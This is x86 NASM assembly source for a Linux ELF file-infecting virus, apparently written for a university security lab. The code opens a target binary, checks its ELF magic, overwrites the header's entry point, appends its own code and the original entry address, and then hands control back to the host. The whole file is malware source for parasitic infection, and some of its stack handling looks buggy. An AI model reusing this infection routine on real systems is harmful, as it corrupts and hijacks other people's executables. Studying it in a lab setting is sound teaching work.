%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; STK_RES Set up ebp and reserve space on the stack for local storage



; 1. Print a message to stdout, something like "This is a virus".

infection:                  ; print the message "Hello, This is a virus"
 	
 	call get_my_loc
 	sub ecx,next_i-msg
 	write 1,ecx,23

; 2. Open an ELF file with a given constant name "ELFexec". The open mode should be RDWR, rather than APPEND.
infector:


	;insert check


    ;get first argument - file name to open. infector (char* ). 8,4, byte 1 (0) 
    mov dword [ebp-8],"ELFe"
    mov dword [ebp-4],"xec"
    mov byte [ebp-1],0
    mov ebx,ebp
    sub ebx,8
    mov ecx,0
    mov ecx,RDWR
    mov edx,0
    mov edx, 0777           ;permits for file.
    open ebx,ecx,edx

    mov [ebp-4], eax  ;save file descripter

    E1:
  	cmp eax,1
  	jge OK
 
 	ERRORLBL: 
  	call get_my_loc
 	sub ecx, next_i - error
 	jmp ecx
 
 	OK:
; e - 45. l - 4c. f - 46.
; 3. Check that the open succeeded, and that this is an ELF file using its magic number.
	mov ecx,[ebp-8]
	read eax, ecx,4
 	cmp byte [ebp-8],'E'
	jne error 

	cmp byte [ebp-7],'L'
	jne error 

	cmp byte [ebp-6],'F'
	jne error 

;TASK 1 STUFF. ;elf header size = 52. 
; A. Code to copy the ELF header into memory (on the stack). Do not forget to make sure that sufficient local storage is allocated on the stack before doing so.
D: 
	
	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET
	
	mov eax,[ebp-4]
	lseek eax, 0, SEEK_END

 	mov esi,eax ;Discovered length, into esi 

 	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET

DD: 
    mov eax,[ebp-4]

    sub ebp,56
    mov ecx,0
    mov ecx,ebp 
    read eax, ecx, 52 ;Read data into ecx. [Elf header]
	mov edi,ecx
 
WTF:

	add ebp,56
	mov eax,[ebp-4]
	lseek eax, 0, SEEK_SET

SAVEOLDENTRY:
	mov ecx,edi
	mov esi, dword [edi+24]
; B. Code to modify the copy of the ELF header of ELFexec that resides in memory, updating the entry point to the first instruction of your virus. Note that this must be the place it resides in memory when the infected ELF file is executed, and not the first instruction in the currently executing virus. In order to find the address to which this file loads to in main memory, you need data from the first program header. At this point you may find its value using readelf and plug it into your code as a constant value.
	;change the entry point to.
 
DDD:
	mov edx, 0x08048000 ;link to program start
	add edx, 660d ;add 660d (fileSize) to point to the end of the program 
	BEFORE:
 	mov dword [ecx+18h],edx ;updating the entry point 
	mov ebx,[ebp-4] ;ebx holds fileDescriptor
	write ebx,ecx,52	     ;write to file
 	
; 4. Add the code of your virus at the end of the ELF file, and close the file. You should use lseek() to get to the end of the file, as it returns a useful number: the number of bytes in the file.

	;eax holds fileDescriptor
 	mov eax,[ebp-4]
	lseek eax, 0, SEEK_END
   
    DDDD: 
    call get_my_loc
 	sub ecx,next_i-_start
    mov ebx,[ebp-4]
    mov edx, PreviousEntryPoint-_start
	write ebx,ecx,edx	     ;write to file

 	ADDITION: 
 	mov ebx,[ebp-4]	;eax holds fileDescriptor. seek last 4 bytes.
	lseek ebx, 0, SEEK_END
	
	mov ebx,[ebp-4] ; 	;writing 4 last bytes: entry point 
	PASS: ;make ecx a pointer to previousEntryPoint
	mov ecx,ebp
	sub ecx, 60
	mov dword [ecx],esi
 	BADPART:
	write ebx , ecx, 4 

	 

;	cmp eax, 0
;		jl error
	
	mov ebx, [ebp-4]
	close ebx 
	add ebp,4

	call get_my_loc
 	add ecx,PreviousEntryPoint-next_i ;ecx points to next_i. Needs to add the offset between next_i and PreviousEntryPoint
 	jmp dword [ecx] ;now ecx points to PreviousEntryPoint
       
 
VirusExit:  
	exit 0


error: ;If error, exit
	call get_my_loc
 	sub ecx,next_i-errorMsg ;ecx holds errorMessage
 	write 1,ecx,22
   
    call get_my_loc
 	add ecx,PreviousEntryPoint-next_i ;ecx points to next_i. Needs to add the offset between next_i and PreviousEntryPoint
 	jmp dword [ecx] ;now ecx points to PreviousEntryPoint
  	 

msg: db "Hello, This is a virus",10,0 ;this is our message
errorMsg: db "Error on file opening",10,0 ;this is our message
virusMsg: db "Virus exited successfully",10,0 ;this is our message

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	


get_my_loc:

	call next_i

next_i: 
	pop ecx
	ret 
virus_end:

PreviousEntryPoint: dd VirusExit ;0x08048080